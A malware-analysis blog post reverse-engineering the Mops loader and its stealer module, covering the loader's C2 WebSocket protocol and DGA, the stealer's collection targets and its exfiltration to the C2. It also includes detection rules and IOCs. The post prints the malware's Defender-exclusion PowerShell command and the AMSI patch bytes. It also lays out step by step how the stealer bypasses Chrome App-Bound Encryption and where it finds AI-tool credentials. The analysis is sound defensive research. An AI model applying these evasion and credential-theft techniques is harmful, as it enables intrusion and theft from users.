+++
title = "Mops: a WebSocket loader and its stealer module 🐶"
author = ["pbo"]
description = """
  Mops is a modular x64 loader delivered by MixLoader and packed with the Golang packer Dormouse. It talks
  to its operator over a hand-rolled WebSocket channel, keeps a 64-domain DGA as fallback, and receives all of
  its capabilities as DLL modules mapped into a suspended cmd.exe. This post details the loader, its C2
  protocol, and the two modules recovered from the live infrastructure: the Mops stealer (also seen branded
  Redhive) and an update/download-and-execute module.
  """
publishDate = 2026-11-01T00:00:00+01:00
tags = ["loader", "stealer", "C2"]
categories = ["RE"]
draft = false
+++

{{< figure src="/ox-hugo/mops_header.jpg" >}}

This analysis is based on a single sample of the Mops Loader (`265994409a3d…`, campaign `6925266445`).
Two other builds were only run through the configuration extractor, to compare their settings (see
[Builds and campaigns](#builds-and-campaigns)); their code was not reversed. The analysed sample is available on
[MalwareBazaar](https://bazaar.abuse.ch/sample/265994409a3dbd511ff5bd6a6d24dea5b089d41f1dea8dcaeaabccd530ea09dd/), and my IDA database of it is in the [Tooling](#tooling) section.

Keep this in mind before reusing the values given here. Anything that is a build parameter rather than a
design choice is likely to change in the next versions: the hardcoded C2, the ports (406, 408 and 1488),
the campaign ID, the install path, the mutex and registry names, the string-encryption constants, and even
the fixed WebSocket key or the `jhkaloip` answer used to fingerprint the servers. Some of them have already
changed between the builds known so far: the C2 is an IP address in some and a domain in others, and the string-encryption constants differ from one build to another. The behaviour (the WebSocket protocol, the
module-based tasking and the stealer's collection logic) is a sturdier basis for detection than any
single value.


## TL;DR Mops {#tl-dr-mops}

-   **Delivery chain**: MixLoader → Dormouse (Go packer) → **Mops Loader** → modules fetched on demand.
-   **A real modular loader**: no shell, no file manager, no stealer code, and no hardcoded list of modules.
    It resolves a C2, waits for `createtask` orders naming _any_ module, and runs the requested DLL inside a
    suspended, windowless `cmd.exe`.
-   **C2**: WebSocket over a raw socket on a non-standard port, with the RFC 6455 _sample_ key hardcoded,
    plain-text `;`-separated messages, and a fallback chain **hardcoded IP → registry cache → DGA**
    (64 `duckdns.org` names, no date seed).
-   **Next stage**: the first, automatic task of every new bot is the platform's own stealer module, which
    calls itself **Mops Stealer V3** (an older build was branded **Redhive Stealer**). It runs 49 collection
    tasks in parallel (browsers, Chrome App-Bound Encryption bypass, crypto wallets, 2FA extensions, Telegram,
    Discord, gaming launchers, VPN, and even AI coding assistants credentials), zips everything in memory and
    ships it over a raw TCP socket.
-   **Beyond the stealer**: a second module can replace the loader with a new build or download and run any
    executable. The stealer is the only module my fake bots were ever tasked with, but follow-on payloads are
    typically pushed only to bots whose stolen data looks valuable.
-   **Infrastructure**: three loader builds (two campaigns use the C2 domain `mops.to`), four C2 servers, and a
    `checkserver` answer that never changes and makes the servers easy to fingerprint.
-   A config extractor and the full DGA list are provided at the end of this post.


## Delivery chain and naming {#delivery-chain-and-naming}

The sample analysed here is the resident stage of a multi-layer chain. An initial access component
tracked as **MixLoader** drops a payload packed with **Dormouse**, a packer written in Go.

{{% sidenote %}}
Dormouse embeds an encrypted and compressed PE, attempts a UAC elevation, weakens Microsoft Defender, then
drops and runs its payload.
{{% /sidenote %}}

Once unpacked, the payload is a native x86-64 implant which I call the **Mops Loader**: its only first-party
purpose is to settle on the host and pull additional modules from its operator.

The roles are cleanly separated:

| Component    | Role                                                     |
|--------------|----------------------------------------------------------|
| MixLoader    | initial access, delivers the packed payload              |
| Dormouse     | Go packer / dropper                                      |
| Mops Loader  | persistent C2 client and module runner                   |
| Mops modules | post-exploitation capabilities, delivered as DLL modules |

{{< figure src="/ox-hugo/mops_infection_chain.svg" caption="<span class=\"figure-number\">Figure 1: </span>Mops infection chain, from delivery to exfiltration" >}}

Two modules were recovered from the live infrastructure: a stealer (the `Stealer` module type, which calls
itself _Mops Stealer V3_ in its latest build and _Redhive Stealer_ in an older one) and a small update and download-and-execute module. Both are described in the
[Next stage](#next-stage-the-modules) section.


## The Mops Loader {#the-mops-loader}


### Obfuscation and string encryption {#obfuscation-and-string-encryption}

The loader is a 64-bit PE (10 sections, around 600 KB) protected with an LLVM-style obfuscator: opaque
predicates, mixed boolean-arithmetic (MBA) expressions, direct calls replaced by lookups in call tables,
and `lea/mov/jmp reg` trampolines that defeat a naive linear disassembly. None of this adds runtime
capability, it only slows down static analysis.

Every meaningful string is encrypted, so a plain `strings` gives nothing useful. Most strings live in
`.rdata` and are decrypted on demand by small per-length wrappers that call a one-byte primitive:

```python
def ror8(value: int, count: int) -> int:
    return ((value >> count) | (value << (8 - count))) & 0xFF


def decrypt(blob: bytes) -> bytes:
    """Mops .rdata string decryption (wide strings use the low byte of each WCHAR)."""
    return bytes(ror8(b, i % 7 + 1) ^ ((13 * i - 105) & 0xFF) for i, b in enumerate(blob))
```

A second class of strings, used mostly by the tasking logic, is built on the stack and decrypted with an
AES-CTR routine keyed by an 8-byte seed stored in `.data`. These are easier to recover by emulating the
decryption routine (Unicorn does the job) than by reimplementing it. API resolution follows the same idea:
encrypted DLL and function names, resolved at runtime with `LoadLibraryA` / `GetProcAddress` and stored in
global slots.

The two constants of the primitive (`13` and `-105` above) are not fixed: other builds use other values
(`13` and `+141` for instance). They are easy to recover from the `imul` / `add` pair that follows the
`movzx eax, al` in the primitive, which is what the extractor provided at the end of this post does.


### Builds and campaigns {#builds-and-campaigns}

Besides the analysed sample, two other loader builds were run through the configuration extractor. Their
configuration follows the same layout, but they use a domain instead of a hardcoded IP and suffix their artefacts with an `A`, probably so that two builds can live
side by side on the same host:

| Build (SHA-256, short) | Campaign     | Hardcoded C2     | Install path / mutex                              |
|------------------------|--------------|------------------|---------------------------------------------------|
| `265994409a3d…` | `6925266445` | `45.91.202.]146` | `RuntimeBroker.exe` / `Global\RuntimeBrokerAds`   |
| `77afc987c830…` | `5749377762` | `mops.]to`       | `RuntimeBrokerA.exe` / `Global\RuntimeBrokerAdsA` |
| `4094bddf226f…` | `8934503551` | `mops.]to`       | `RuntimeBrokerA.exe` / `Global\RuntimeBrokerAdsA` |

All of them report version `1.0.0`, keep ports 406/408, the `WinRAR\Libs` module cache and the
`.duckdns.org` DGA suffix. The operators did not even bother to hide the family name: it is the C2 domain.

Another build, not analysed here, was described publicly by winslow (see [References](#references)): it installs
itself as the same `RuntimeBroker.exe` with the same `Global\RuntimeBrokerAds` mutex and four scheduled tasks,
and talks to `145.63.134.]94` on ports 406, 408 and 1488, the server that also received the `1.0.2` stealer's
loot. It was delivered differently, through a fake GitHub repository and a PowerShell stager rather than
MixLoader.


### Anti-analysis {#anti-analysis}

Before doing anything else, the loader checks that it is not running in a VM, a sandbox or under a debugger,
and silently exits otherwise:

| Check             | Implementation                                                                                               |
|-------------------|--------------------------------------------------------------------------------------------------------------|
| Display           | `EnumDisplaySettingsW`: exit if the refresh rate is below 50 Hz (headless or emulated display)               |
| Guest drivers     | `GetModuleHandleA` on VirtualBox, VMware, QEMU, Parallels and Xen drivers (`VBoxGuest.sys`, `vmhgfs.sys`...) |
| Guest devices     | `CreateFileA` on `\\.\VBoxMiniRdrDN`, `\\.\HGFS`, `\\.\prl_usb_mouse`                                        |
| CPUID             | hypervisor vendor leaf (`KVMKVMKVM`, `VMwareVMware`, `XenVMMXenVMM`, `VBoxVBoxVBox`...)                      |
| CPU brand         | brand string containing `EPYC`, `Broadwell` or `G6900` (typical cloud sandboxes)                             |
| GPU name          | `Direct3DCreate9` adapter name: VMware SVGA, VirtualBox, QXL, Virtio, Hyper-V... and `anyrun GPU`            |
| Timing (thread)   | `QueryPerformanceCounter` drift around a `Sleep`                                                             |
| Debugger (thread) | `NtQueryInformationProcess(ProcessDebugObjectHandle)` in a loop                                              |

The GPU check is worth noting: the list explicitly contains the adapter name of a public sandbox service.


### Installation, privilege escalation and persistence {#installation-privilege-escalation-and-persistence}

Once the environment looks genuine, the loader:

1.  creates a single-instance mutex (`Global\RuntimeBrokerAds`);
2.  patches AMSI in its own process (see below);
3.  copies itself to `C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe`, sets the file _hidden_ and _system_,
    starts this copy and exits, so the long-running instance always lives under the disguised path;
4.  if the process is not a member of the local Administrators group, it elevates with the well-known
    **CMSTPLUA** COM UAC bypass.

    {{% sidenote %}}
    `Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` then `ICMLuaUtil::ShellExec`.
    {{% /sidenote %}}

    Before the elevation it rewrites its own PEB (image path and command line) so that it looks like
    `explorer.exe`, a precondition for the elevation to be granted silently;
5.  enables `SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege` and `SeIncreaseQuotaPrivilege`;
6.  registers four scheduled tasks through the Task Scheduler COM API (`ITaskService`), so no `schtasks.exe`
    command line is ever visible.

| Task                                                                        | Trigger          |
|-----------------------------------------------------------------------------|------------------|
| `\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskWindowsLogins` | boot             |
| `\Microsoft\Windows\RegisterDeviceAccountChange\ProgramDataUpdate`          | boot + 5 s       |
| `\Microsoft\Windows\EDP\ScheduledDef`                                       | boot + 15 s      |
| `\Microsoft\Location\MicrosoftUpdaterMachineCore`                           | every 30 minutes |

The task descriptions are copied from genuine Microsoft ones ("Updates compatibility database",
"Handles restoring settings from the cloud") and run with the highest privileges when the implant is
elevated. The binary also contains a critical-process routine (`RtlSetProcessIsCritical`, with a hidden
window that clears the flag on `WM_QUERYENDSESSION` so the machine can still shut down), but it is not
reachable from the main flow in this build.


### Defense evasion {#defense-evasion}

-   **AMSI**: the loader resolves `AmsiOpenSession`, makes it writable and overwrites the first bytes with
    `48 31 C0` (`xor rax, rax`). The original `test rdx, rdx` disappears, the following `jz` is always taken and
    every scan request fails with `E_INVALIDARG`.
-   **Microsoft Defender**: a dedicated thread starts a hidden `cmd.exe` that excludes both working
    directories and refreshes the policy:

<!--listend-->

```powershell
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Windows\Microsoft','C:\ProgramData\Microsoft\Windows'" && gpupdate /force
```


## Command and control {#command-and-control}


### Finding a live server {#finding-a-live-server}

The C2 resolution follows a fixed order:

1.  a TCP probe of the **hardcoded C2** on port 406 (an IP address in the first build, `mops.to` in the later ones);
2.  a host **cached in the registry** by a previous session (`HKCU\Software\Microsoft\EventSystem`, value `System`);
3.  the **DGA**: if both fail, two background threads keep re-probing (1) and (2) every 60 seconds while the
    main thread walks through the generated domains.

The DGA has no date component: it is every ordered combination of six tokens taken from `{lav, ini}`,
suffixed with `.duckdns.org`. The whole space is only 2^6 = 64 domains, which can be enumerated and blocked
in advance:

```python
import itertools

def mops_dga(suffix: str = "duckdns.org") -> list[str]:
    return ["".join(c) + "." + suffix for c in itertools.product(("lav", "ini"), repeat=6)]

# lavlavlavlavlavlav.duckdns.org ... iniiniiniiniiniini.duckdns.org
```

Every candidate is validated before being used: the loader opens a WebSocket and sends
`checkserver;<bot_id>;<16 random alphanumeric chars>`. The server is accepted if, and only if, its answer is
exactly 8 bytes long. Failed names go into an in-memory blacklist; the first server that answers correctly
wins and is written back to the registry, so the next run reconnects immediately.

{{< figure src="/ox-hugo/c2_checkserver.png" caption="<span class=\"figure-number\">Figure 2: </span>`c2_checkserver`: the probe sent to every candidate C2; only the length of the answer is checked" >}}


### A hand-rolled WebSocket {#a-hand-rolled-websocket}

The transport is a WebSocket client written on top of raw Winsock (no WinHTTP), on TCP/406. The upgrade
request always carries the same key:

```text
GET / HTTP/1.1
Host: <c2>
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

`dGhlIHNhbXBsZSBub25jZQ==` is "the sample nonce", the example value of RFC 6455.

{{% sidenote %}}
RFC 6455, section 1.3: [Opening Handshake](https://www.rfc-editor.org/rfc/rfc6455#section-1.3). A
legitimate client must send a random nonce for every connection.
{{% /sidenote %}}

A real browser never sends it, which makes it an excellent network signature. The expected answer is
equally static:

```python
import base64, hashlib

key = "dGhlIHNhbXBsZSBub25jZQ=="
magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
print(base64.b64encode(hashlib.sha1((key + magic).encode()).digest()).decode())
# s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Client frames are binary (`0x82`) and always masked (mask = `GetTickCount() ^ buffer pointer`); the 64-bit
length encoding is buggy, so the client never sends large frames. The application payload is plain ASCII,
`;`-separated, with no additional encryption.

{{< figure src="/ox-hugo/ws_send_frame.png" caption="<span class=\"figure-number\">Figure 3: </span>`ws_send_frame`: binary frame, predictable masking key and broken 64-bit length" >}}


### Session protocol {#session-protocol}

The bot identifier is the serial number of the `C:\` volume, rendered as 8 lowercase hexadecimal characters:
stable across reboots, unique enough per machine.

| Direction  | Message                                             | Purpose                          |
|------------|-----------------------------------------------------|----------------------------------|
| bot → C2 | `ready;<bot_id>;version;1.0.0`                      | first frame, announces the build |
| C2 → bot | `getinfo`                                           | host profiling request           |
| bot → C2 | `info;<antivirus>;<OS>;<user>;<campaign_id>`        | answer (WMI `SecurityCenter2`)   |
| C2 → bot | `ping`                                              | keepalive, answered by `pong`    |
| C2 → bot | `task;createtask;<type>;task_id;<id>;version;<ver>` | run a module                     |
| C2 → bot | `task;closetask;...`                                | kill a running module            |
| bot → C2 | `task_done;<task_id>`                               | module launched                  |

The version is sent in the first frame and the campaign identifier in the `info` answer, which lets the
operator split infections per build and per campaign.


### Tasking: how a module is run {#tasking-how-a-module-is-run}

A `createtask` order names a module _type_ and _version_. The loader then:

1.  looks for the module in a **registry cache** under a key borrowed from an unrelated application,
    `HKCU\Software\WinRAR\Libs`, stored as `REG_BINARY` chunks named `<type>_<ver>_chunk_<n>` (200 KB each,
    3 MB max). Cached versions of the same type that do not match are deleted;
2.  if it is not cached, **downloads** it over plain HTTP from the hardcoded IP on **port 408**, with the bot
    identifier as User-Agent, checks that the answer is a DLL (`IMAGE_FILE_DLL`) and stores it
    (first as `_tempchunk_` values, then renamed);
3.  starts `C:\Windows\System32\cmd.exe` with `CREATE_SUSPENDED | CREATE_NO_WINDOW` and **manually maps** the
    DLL into it (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, a small loader stub, a 56-byte context
    holding the task parameter, `NtCreateThreadEx`);
4.  records the host PID against the task identifier, so that a later `closetask` can terminate it.

<!--listend-->

```text
GET /task/Stealer HTTP/1.1
Host: <c2>
User-Agent: <bot_id>
Connection: close
```

A special parameter, `update`, makes the loader acknowledge the task, clear its critical-process state and
exit, leaving room for a freshly delivered build (see the update module below).


### What the live C2 actually does {#what-the-live-c2-actually-does}

To see the operator side, I wrote an emulated bot that speaks the protocol above, never executes anything,
and only saves the downloaded modules to disk. It was connected over Tor to the hardcoded server and to two
other servers of the same infrastructure. Some observations differ from what the static analysis suggested:

-   the C2 sends `getinfo` first, then a `ping` keepalive every 15 seconds;
-   in real traffic, the module type is a **positional** field right after the command:
    `task;createtask;Stealer;task_id;x55oh5_tyf7;version;1.0.3`;
-   task identifiers are random 11-character tokens (`[a-z0-9_]`), not counters. Yet the hardcoded C2 sent
    **the same** `task_id` to every bot I connected, whatever its bot identifier: it is a campaign-wide
    "autorun" task, not an order targeting a specific victim;
-   the server validates nothing: a bot announcing version `2.0.0`, or sending a junk campaign identifier,
    receives the same task and can download the module;
-   the task `version` is the **module** version, independent of the loader build (`1.0.0`). Two stealer builds
    were served: `1.0.3` by the hardcoded C2, `1.0.2` by another server;
-   one server (`188.137.246.]156`) answered and kept the session alive, but never sent any task;
-   the `checkserver` probe is always answered with the same 8 bytes, `jhkaloip`, on every server tested.

This is the classic behaviour of a pay-per-install style platform: as soon as a new bot checks in, the
first task is to run the stealer.


#### Fingerprinting the servers {#fingerprinting-the-servers}

The constant `checkserver` answer, combined with the static WebSocket key, makes the C2 trivial to
fingerprint: send the RFC 6455 sample key on port 406, then `checkserver;<8 hex>;<16 chars>`, and check
whether the answer is `jhkaloip`. An Internet-wide search (Censys, October 2026) returned four hosts: the
three already known and one more in the same /24 as the hardcoded C2 (`45.91.202.]47`).


## Next stage: the modules {#next-stage-the-modules}

Mops is not a stealer with a loader bolted on: the loader is module-agnostic, and the operator decides what
each bot runs. In the observed campaigns, the decision is always the same for a new bot: the C2 hands out a
single, campaign-wide `createtask Stealer` order (the same `task_id` for every bot), so the stealer runs
first, everywhere. The second module, which can update the loader or deploy any executable, is what turns a
stolen-data harvest into a foothold that can be resold or reused; none of my emulated bots received such a
task, which is expected for bots that have nothing interesting to steal.

Both recovered modules follow the same contract, which says a lot about how the platform is built:

-   they are DLLs whose `DllMain` **refuses to run outside a Mops host**: they exit unless the loader's mutex
    (`Global\RuntimeBrokerAds`) already exists, then take their own mutex (`Global\StealerLib`,
    `Global\LoaderLib`). Run on its own, without the loader's mutex, a module simply exits;
-   the work is done in a new thread; the task parameter comes either from the injected context or from an
    `INJECT_PARAM` environment variable;
-   they compute the bot identifier exactly like the loader (`C:\` volume serial), so whatever they send back
    can be correlated with the bot on the operator side.


### The Mops stealer (`Stealer` module) {#the-mops-stealer--stealer-module}

The `Stealer` module is a C++ DLL. Two builds were recovered from the live servers, and they do not even
agree on their own name: the first line of their system report is the developer's banner.

| Module version | Size   | Banner in `System.txt`              | Exfiltration server   |
|----------------|--------|-------------------------------------|-----------------------|
| `1.0.2`        | 1.4 MB | `- Redhive Stealer:` (`11.05.2026`) | `145.63.134.]94:1488` |
| `1.0.3`        | 1.1 MB | `- Mops Stealer V3: 08.09.2026`     | `45.91.202.]146:1488` |

Both have the same task list and the same exfiltration protocol: between the two builds, the developer
renamed the module from **Redhive Stealer** to **Mops Stealer V3**, after the loader. Build `1.0.2` is the one
winslow documented under the Redhive name after being infected through a fake GitHub repository
([Hey, You Hacked a Hacker! Are You Ready For My Revenge?](https://winslow1984.com/books/threat-intelligence/page/hey-you-hacked-a-hacker-are-you-ready-for-my-revenge)); the SHA-256 given there matches the one listed
in the IOCs below. From here on I will simply call it the Mops stealer. Its entry point enables `SeDebugPrivilege` and
`SeImpersonatePrivilege`, then starts **49 named tasks, each in its own thread**, and waits for all of them:

| Category           | Tasks / targets                                                                                                                               |
|--------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| System             | screenshots (GDI + GDI+ JPEG), clipboard, process list, installed software, Windows product key, system report                                |
| Browsers           | passwords, cookies, autofill, installed browsers: about 60 Chromium-based browsers, Firefox and its forks, Tor Browser                        |
| Chrome ABE         | `EncryptKey` and `AppBoundKey` tasks (see below)                                                                                              |
| Crypto             | dozens of desktop wallets (Exodus, Electrum, Atomic, Ledger Live, Monero, Wasabi...) and wallet extensions (MetaMask, Phantom, Trust, OKX...) |
| 2FA / passwords    | Google Authenticator, Authy, Microsoft Authenticator, Bitwarden, KeePassXC, LastPass, NordPass... extensions                                  |
| Messaging          | Telegram (desktop, web sessions, wallets), Discord tokens, Tox, Jabber (Pidgin), Viber, MicroSIP                                              |
| Gaming             | Steam (tokens, cookies), Battle.net, Epic Games, Riot Games, Rockstar / GTA V, GTA5RP, Roblox, Minecraft clients, EXBO                        |
| Remote access, ops | AnyDesk, ngrok, FileZilla, Cyberduck, DynDNS, OBS stream keys                                                                                 |
| VPN                | OpenVPN, ProtonVPN, Surfshark, Windscribe                                                                                                     |
| AI coding tools    | Claude Code, Codex, Gemini CLI configuration and credentials                                                                                  |
| Files              | `.txt`, `.pdf`, `.doc(x)`, images: 5 MB per file, 20 MB in total, into `Important Files/`                                                     |


#### Getting around Chrome App-Bound Encryption {#getting-around-chrome-app-bound-encryption}

Since Chrome 127, cookies are protected by _App-Bound Encryption_.

{{% sidenote %}}
Google Security Blog, July 2024:
[Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html).
{{% /sidenote %}}

The cookie key is wrapped twice, with the user DPAPI and then with the SYSTEM DPAPI on top, and is supposed
to be unwrapped only by Chrome's elevation service. The stealer bypasses the service and does the work itself:

1.  read `app_bound_encrypted_key` from the browser's `Local State`;
2.  find `winlogon.exe`, duplicate its token and impersonate it: the thread is now SYSTEM;
3.  `CryptUnprotectData` (SYSTEM DPAPI layer), `RevertToSelf`, `CryptUnprotectData` again (user layer);
4.  for the newest key format (a 93-byte blob whose first byte is `3`), impersonate SYSTEM again and decrypt
    the inner key with the CNG key **`Google Chromekey1`** of the _Microsoft Software Key Storage Provider_
    (`NCryptOpenKey` / `NCryptDecrypt`, 32-byte output);
5.  store the result as `<browser>_AppBoundKey` and use it to decrypt the App-Bound protected cookies.

This requires administrative rights to open `winlogon.exe`'s token, which the loader already obtained
through its UAC bypass: the loader and the module are clearly designed to work together.


#### AI coding assistants {#ai-coding-assistants}

A recent addition to the usual stealer target list: three tasks collect the local configuration of AI
coding agents, which frequently holds API keys or OAuth tokens:

| Task       | Files                                                            |
|------------|------------------------------------------------------------------|
| ClaudeCode | `%USERPROFILE%\.claude\settings.json`                            |
| Codex      | `%USERPROFILE%\.codex\auth.json`, `config.toml`                  |
| Gemini     | `%USERPROFILE%\.gemini\oauth_creds.json`, `google_accounts.json` |


#### Exfiltration {#exfiltration}

Everything is written into a ZIP archive built in memory, organised in folders (`Applications/Telegram/`,
`CryptoWallets/Extensions/`, `Vpn/ProtonVPN/`...) next to a `System.txt` report. The report is a template
whose placeholders are filled on the server side:

```text
- Lid: %worker%
- IP Address: %ip%
- Time Save Log: %timesave%
- Country: %country%
```

The module even adds `Applications/Debug/TimesExecutions.txt`, a per-task timing log left by the developer.

The archive is not sent to the Mops C2 channel but to a dedicated listener, over raw TCP, with a minimal
handshake:

```text
bot  → server : "stealer;" + <bot_id> + "\n"
server → bot  : "auth_ok"
bot  → server : <archive size, 8 bytes, big-endian>
bot  → server : <ZIP archive>
```

Then the module calls `ExitProcess`: it is a one-shot collection, the loader can run it again later with a
new task. Each build embeds its own listener, always on TCP/1488 of the very server that delivered it.


#### Seeing it run {#seeing-it-run}

The `1.0.3` module was also detonated in a Triage sandbox. The network capture contains a single
interesting TCP session, to the hardcoded C2 on port 1488, which matches the protocol above byte for byte:

```text
stealer;8914e807\n                  ← bot identifier (C:\ volume serial)
auth_ok\n
00 00 00 00 00 26 24 34             ← 2,499,636 bytes, big-endian
50 4B 03 04 ...                     ← the ZIP archive
```

Once the stream is reassembled, the archive opens with any unzip tool. On this freshly installed sandbox it
contains 26 files: the browser databases copied as-is (`Chrome_Default_Passwords`, `Edge_Default_Cookies`,
`Firefox_<profile>_Cookies`...), the encryption keys (`Chrome_EncryptedKey`, `Edge_EncryptedKey` and
`Chrome_AppBoundKey`, recovered from a Chrome 140 profile), the decoy documents of the desktop in
`Important Files/`, the process list, the installed software, the screenshot and the system report:

```text
- Mops Stealer V3: 08.09.2026
- Lid: %worker%

- OS Version: Windows 10 Pro (10.0.19041) x64
- Computer: FOOHEZMB
- User: Admin
- Anti Virus: Unknown
- HWID: 8914e807
- CPU Name: Intel Core Processor (Broadwell)
- GPU: Microsoft Basic Render Driver
- Display resolution: 1920x1080

- IP Address: %ip%
- Country: %country%
```

The developer's timing log (`TimesExecutions.txt`) shows where the time goes: most tasks find nothing and
return in less than a millisecond, the system report (848 ms), the screenshot (659 ms) and the cookies
(505 ms) are the slowest. The whole collection takes less than a second.

Note that this sandbox profile (a Broadwell CPU and the _Microsoft Basic Render Driver_) is exactly what the
loader's anti-analysis checks would reject: the stealer module itself does not carry those checks.


### The update and download-and-execute module {#the-update-and-download-and-execute-module}

The second module (mutex `Global\LoaderLib`) is much smaller and gives the operator two capabilities through
its task parameter:

-   `update`: wait 6 seconds, download `GET /task/build` from the C2 module port (408) with the bot identifier
    as User-Agent, overwrite `C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe` and start it. Combined with the
    loader's own `update` handling (acknowledge and exit), this is how the operator rolls out new loader builds;
-   a **URL**: download the file and run it as `C:\ProgramData\svc_<8 hex>.exe` (the name is derived from
    `GetTickCount() ^ 0xDEADBEEF`). If the URL points to the C2 itself, the file is fetched from
    `/files?id=<name>` on port 408 instead.

The downloader is basic but careful: it checks `Content-Length`, verifies that the body is a well-formed PE
(MZ, PE signature, a sane optional header) before writing it, and starts it with a hidden window. This is the
"next payload" channel of the platform: anything the operator wants to sell or deploy on the bot can be
pushed with a single task.


## Detection opportunities {#detection-opportunities}

Most of these do not depend on a specific campaign:

-   **Network**:
    -   a WebSocket upgrade with `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==` to a non-standard port;
    -   binary WebSocket frames starting with `checkserver;`, `ready;` or `task_done;`;
    -   DNS requests matching `^(lav|ini){6}\.duckdns\.org$`;
    -   `GET /task/<name>` or `/files?id=` with an 8-hex-character User-Agent;
    -   a raw TCP stream starting with `stealer;` followed by 8 hex characters, answered by `auth_ok`;
    -   a WebSocket server answering exactly `jhkaloip` to `checkserver;`, which is how the C2 can be hunted;
    -   DNS requests for `mops.to`.
-   **Host**:
    -   `cmd.exe` created suspended and without window, then written to and given a new thread by another process;
    -   `Add-MpPreference -ExclusionPath` chained with `gpupdate /force`;
    -   scheduled tasks under `\Microsoft\...` whose action points to `C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe`;
    -   large `REG_BINARY` values starting with `MZ` under `HKCU\Software\WinRAR\Libs`;
    -   a non-browser process duplicating `winlogon.exe`'s token, then opening the `Google Chromekey1` CNG key.
-   **Memory**: `amsi!AmsiOpenSession` starting with `48 31 C0` instead of `48 85 D2`.


## Tooling {#tooling}

The configuration of a Mops Loader build can be recovered statically. The extractor below first recovers
the per-build constants of the string primitive, then decrypts all the `.rdata` strings and keeps the ones
that make the configuration (C2, ports, campaign, version, install path). It relies on `lief` and never
executes the sample; it works on the three builds listed above.

{{< download "mops/mops_config_extractor.py" "mops/mops_dga_domains.txt" >}}

```text
$ python3 mops_config_extractor.py 77afc987c83097f06bc98e45a4b7891e96017f59ab309a4744c7aee414926ad1
{
  "c2": [
    "mops.to"
  ],
  "ports": [
    "406",
    "408"
  ],
  "campaign_id": "5749377762",
  "version": "1.0.0",
  "install_path": "C:\\ProgramData\\Windows\\Microsoft\\RuntimeBrokerA.exe"
}
```

My IDA database of the analysed loader (`265994409a3d…`, unpacked payload) is also available, with the
functions, types and comments used throughout this post (`c2_checkserver`, `ws_send_frame`,
`handle_task_msg`, `struct mops_task=…). It contains the sample itself, so it is shipped as a ZIP
archive protected with the usual password, =infected`.

{{< download "mops/mops_loader_265994409a3d.i64.zip" >}}


## Indicators of compromise {#indicators-of-compromise}


### Files {#files}

| Component                                                                                                                                            | SHA-256                                                            |
|------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------|
| Mops Loader, campaign 6925266445 ([MalwareBazaar](https://bazaar.abuse.ch/sample/265994409a3dbd511ff5bd6a6d24dea5b089d41f1dea8dcaeaabccd530ea09dd/)) | `265994409a3dbd511ff5bd6a6d24dea5b089d41f1dea8dcaeaabccd530ea09dd` |
| Mops Loader, campaign 5749377762                                                                                                                     | `77afc987c83097f06bc98e45a4b7891e96017f59ab309a4744c7aee414926ad1` |
| Mops Loader, campaign 8934503551                                                                                                                     | `4094bddf226fb6dd45e72ce8e5d3c3fc51c96ecef9473712aff06083445503e4` |
| Mops Loader, reported by winslow                                                                                                                     | `97c6e8a58c8ca86af979fa64a516a09cdc48c6dd61fc9dd027c4af715165fb66` |
| Stealer module 1.0.3 (Mops Stealer V3)                                                                                                               | `3c110de70db7225573f6bd937a7704423bce6c03fad5fac3ea3fb5bacf130d50` |
| Stealer module 1.0.2 (Redhive)                                                                                                                       | `9651824ed3d16bb543762a1aa5498d7fde278567c001605d0a32c2db0125cfb3` |
| Update / download module                                                                                                                             | `d7296170408581c38dc2c95f0c31f6b9bdf822b9b076d90122e679e13269a935` |


### Network {#network}

| Indicator                      | Role                                                                                      |
|--------------------------------|-------------------------------------------------------------------------------------------|
| `mops.]to`                     | hardcoded C2 of the two other loader builds                                               |
| `45.91.202.]146`               | hardcoded C2 (TCP/406 WebSocket, TCP/408 modules), stealer 1.0.3 exfiltration on TCP/1488 |
| `145.63.134.]94`               | C2 and module server, stealer 1.0.2 exfiltration on TCP/1488                              |
| `188.137.246.]156`             | C2, hardcoded in the update module (TCP/408)                                              |
| `45.91.202.]47`                | same C2 fingerprint (Censys), no tasking observed                                         |
| `(lav or ini){6}.duckdns.]org` | 64 DGA domains (full list in `mops_dga_domains.txt`)                                      |


### Host {#host}

-   `C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe` or `RuntimeBrokerA.exe` (hidden, system)
-   `C:\ProgramData\svc_<8 hex>.exe` (payloads dropped by the download module)
-   mutexes `Global\RuntimeBrokerAds` (`…AdsA` in the two other builds), `Global\StealerLib`, `Global\LoaderLib`
-   `HKCU\Software\Microsoft\EventSystem` value `System` (cached C2)
-   `HKCU\Software\WinRAR\Libs` values `<type>_<ver>_chunk_<n>` (module cache)
-   the four scheduled tasks listed above
-   Defender exclusions on `C:\ProgramData\Windows\Microsoft` and `C:\ProgramData\Microsoft\Windows`


## MITRE ATT&amp;CK {#mitre-att-and-ck}

| Tactic               | Technique                                                                                                                                                                                         |
|----------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Execution            | T1106 Native API, T1059.001 PowerShell, T1059.003 Windows Command Shell                                                                                                                           |
| Persistence          | T1053.005 Scheduled Task                                                                                                                                                                          |
| Privilege escalation | T1548.002 Bypass UAC, T1134.001 Token Impersonation                                                                                                                                               |
| Defense evasion      | T1027.013 Encrypted strings, T1562.001 Disable tools (AMSI, Defender), T1036.005 Masquerading, T1564.001 Hidden files, T1055 Process Injection, T1497.001 Sandbox evasion, T1622 Debugger evasion |
| Credential access    | T1555.003 Credentials from Web Browsers, T1539 Steal Web Session Cookie, T1552.001 Credentials in Files                                                                                           |
| Discovery            | T1082 System Information, T1518.001 Security Software, T1057 Process Discovery                                                                                                                    |
